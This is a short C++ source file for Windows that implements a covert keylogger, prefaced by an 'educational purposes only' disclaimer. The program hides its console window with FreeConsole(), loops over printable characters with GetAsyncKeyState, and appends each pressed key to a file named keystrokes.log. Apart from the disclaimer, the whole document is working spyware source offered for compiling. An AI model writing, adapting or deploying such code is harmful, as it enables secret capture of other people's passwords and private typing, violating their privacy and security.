/*
 * All contents are for educational purposes only. Please check with your local
 * laws and legislations before proceeding. Contributors of this project take
 * zero responsibility or liability for any damage caused by these contents.
 * You are responsible for your own actions. Once again, all contents are for
 * educational purposes only.
 *
 * This program is a demonstration and is intentionally not meant to be fully
 * functional or useful in general contexts. It outlines a basic algorithm and
 * does not contain any features beyond that.
 *
 * Compile: x86_64-w64-mingw32-g++ source.cpp
 */

#include <stdio.h>   /* fopen(), fprintf(), fclose() */
#include <windows.h> /* freeConsole(), GetAsyncKeyState() */

int main()
{
	/* Detach from the console. */
	FreeConsole();

	while (true) {

		/* For printable ASCII characters. */
		for (char ascii = 32; ascii <= 126; ascii++) {

			/* If the character is pressed. */
			if (GetAsyncKeyState(ascii) == -32767) {

				/* Record the character. */
				FILE *f = fopen("keystrokes.log", "a");
				fprintf(f, "%c", ascii);
				fclose(f);
			}
		}
	}

	return 0;
}
